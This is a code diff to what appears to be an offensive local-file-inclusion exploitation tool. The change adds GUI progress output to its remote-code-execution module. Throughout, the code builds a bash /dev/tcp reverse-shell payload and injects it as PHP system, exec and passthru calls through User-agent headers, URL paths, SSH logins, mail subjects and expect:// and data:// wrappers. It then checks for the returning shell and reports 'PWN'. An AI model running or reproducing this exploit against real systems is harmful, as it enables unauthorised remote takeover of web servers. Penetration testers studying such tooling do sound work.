@@ -487,7 +487,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
 
 
 def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-            authcookie, postdata, depth, gui):
+            authcookie, postdata, depth, gui, app):
     """
     second exploitation module: try to gain a reverse shell over the system
     @params:
@@ -503,6 +503,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
     print(color.RD+"[INFO]" + color.O + " RCE" + color.END + color.RD + "|" + color.END + "  "
           + color.RC + "Using Technique:" + color.END + color.O + "" + str(rce[technique]) + color.END)
+    if gui:
+        gui.crawlerResultDisplay.append("[Info] RCE|  Using Technique: {}".format(str(rce[technique])))
+        gui.show()
+        app.processEvents()
 
     if technique == 1:
         file = "/proc/self/environ"
@@ -578,7 +582,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     break
 
     if success:
-        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(LISTENIP, LISTENPORT)
+        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(vars.LISTENIP, vars.LISTENPORT)
         if technique != 6:
             if attack == 1:
                 prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
@@ -598,52 +602,100 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         if technique == 1:
             prep.headers['User-agent'] = '<?php system("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
             prep.headers['User-agent'] = '<?php exec("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
             prep.headers['User-agent'] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying passthru():{1}    ".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
         elif technique == 2 or technique == 5:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
             prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
             prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
             prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
             sys.stdout.write("{0}  : Trying passthru():    {1}".format(color.RD, color.END))
+            if gui:
+                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
+                gui.show()
+                app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
                 s.send(prep, timeout=timeout)
-                showStatus()
+                showStatus(gui)
+                if app:
+                    app.processEvents()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                showStatus(timeout=True)
+                showStatus(gui, timeout=True)
+                if app:
+                    app.processEvents()
         elif technique == 3:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -655,18 +707,28 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             ssht = ["system():      ", "exec():        ", "passthru():    "]
             for i in range(0, len(sshs)):
                 sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, ssht[i]))
+                if gui:
+                    gui.crawlerResultDisplay.append("  : Trying {}".format(ssht[i]))
+                    gui.show()
+                    app.processEvents()
                 try:
                     if sys.platform.lower().startswith("win"):
                         subprocess.run(["putty.exe", "-ssh", sshs[i]])
                     else:
                         subprocess.run(["ssh", sshs[i]])
                 except Exception as e:
-                    showStatus(exception=e)
+                    showStatus(gui, exception=e)
+                    if app:
+                        app.processEvents()
                 try:
                     s.send(prep, timeout=timeout)
-                    showStatus()
+                    showStatus(gui)
+                    if app:
+                        app.processEvents()
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    showStatus(timeout=True)
+                    showStatus(gui, timeout=True)
+                    if app:
+                        app.processEvents()
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -678,15 +740,26 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             host = tmp.split("/")[0].split(":")[0]
             for i in range(0, len(topics)):
                 sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, topict[i]))
+                if gui:
+                    gui.crawlerResultDisplay.append("  : Trying {}".format(topict[i]))
+                    gui.show()
+                    app.processEvents()
                 try:
                     p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
                     subprocess.call(["mail", "-s", topics[i], "www-data@{}".format(host)], stdin=p.stdout)
                 except Exception as e:
-                    showStatus(exception=e)
+                    showStatus(gui, exception=e)
+                    if app:
+                        app.processEvents()
                 try:
                     s.send(prep, timeout=timeout)
+                    showStatus(gui)
+                    if app:
+                        app.processEvents()
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    showStatus(timeout=True)
+                    showStatus(gui, timeout=True)
+                    if app:
+                        app.processEvents()
         elif technique == 6:
             wrappers = [
                 'expect://{}'.format(PAYLOAD),
@@ -697,46 +770,57 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 'data://text/plain;base64,' + encode64('<?php exec("{}"); ?>'.format(PAYLOAD)),
                 'data://text/plain;base64,' + encode64('<?php passthru("{}"); ?>'.format(PAYLOAD))
             ]
-            if attack == 1:
-                for wrapper in wrappers:
+
+            names = [
+                "expect:                ",
+                "data - system():       ",
+                "data - exec():         ",
+                "data - passthru():     ",
+                "data(b64) - system():  ",
+                "data(b64) - exec():    ",
+                "data(b64) - passthru():"
+            ]
+
+            for i in range(0, len(wrappers)):
+                wrapper = wrappers[i]
+                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, names[i]))
+                if gui:
+                    gui.crawlerResultDisplay.append("  : Trying {}".format(names[i]))
+                    gui.show()
+                    app.processEvents()
+                if attack == 1:
                     prep = query("", "", wrapper, "", keyword, url, url2, s)[0]
-                    try:
-                        s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached @technique {}".format(technique))
-            elif attack == 2:
-                for wrapper in wrappers:
+                elif attack == 2:
                     prep = inpath("", "", wrapper, "", url, url2, s)[0]
-                    try:
-                        s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached @technique {}".format(technique))
-            elif attack == 3:
-                for wrapper in wrappers:
+                elif attack == 3:
                     s.cookies.set(selected, wrapper)
                     req = requests.Request(method='GET', url=url)
                     prep = s.prepare_request(req)
-                    try:
-                        s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached @technique {}".format(technique))
-            elif attack == 4:
-                for wrapper in wrappers:
+                elif attack == 4:
                     req = requests.Request(method='POST', url=url, data=wrapper)
                     prep = s.prepare_request(req)
                     newBody = unquote(prep.body)
                     prep.body = newBody
                     prep.headers["content-length"] = len(newBody)
-                    try:
-                        s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached @technique {}".format(technique))
+                try:
+                    s.send(prep, timeout=timeout)
+                    showStatus(gui)
+                    if app:
+                        app.processEvents()
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    showStatus(gui, timeout=True)
+                    if app:
+                        app.processEvents()
     else:
         sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        if gui:
+            gui.crawlerResultDisplay.append(" FAIL\n")
+            gui.show()
+            app.processEvents()
 
 
 def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-             authcookie, postdata, depth, gui=None):
+             authcookie, postdata, depth, gui=None, app=None):
     """
     invoke sheller() for each technique
     @params:
@@ -745,27 +829,43 @@ def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, 
         (see other methods)
     """
     print()
+    if gui and app:
+        gui.crawlerResultDisplay.setText("")
+        gui.show()
+        app.processEvents()
     for technique in techniques:
         sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-                authcookie, postdata, depth, gui)
+                authcookie, postdata, depth, gui, app)
 
 
-def showStatus(timeout=False, exception=None):
+def showStatus(gui, timeout=False, exception=None):
     """
     print status of RCE probe
     """
     if exception:
         sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
         print("{0}Exception:{1}\n{2}".format(color.O, color.END, exception))
+        if gui:
+            gui.crawlerResultDisplay.append(" FAIL\nException:\n{}\n".format(exception))
+            gui.show()
         return
     if timeout:
         sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
         print("{0}Timeout{1}".format(color.O, color.END))
+        if gui:
+            gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
+            gui.show()
         return
     if checkConn():
         sys.stdout.write("{0} PWN{1}\n".format(color.O, color.END))
+        if gui:
+            gui.crawlerResultDisplay.append(" PWN\n")
+            gui.show()
     else:
         sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        if gui:
+            gui.crawlerResultDisplay.append(" FAIL\n")
+            gui.show()
 
 
 def checkConn():
@@ -779,7 +879,7 @@ def checkConn():
         connections = psutil.net_connections()
         for connection in connections:
             # we are interested in our netcat socket
-            if connection.laddr[1] == LISTENPORT:
+            if connection.laddr[1] == vars.LISTENPORT:
                 if connection.status == psutil.CONN_ESTABLISHED:
                     # shell has arrived, all good
                     return True
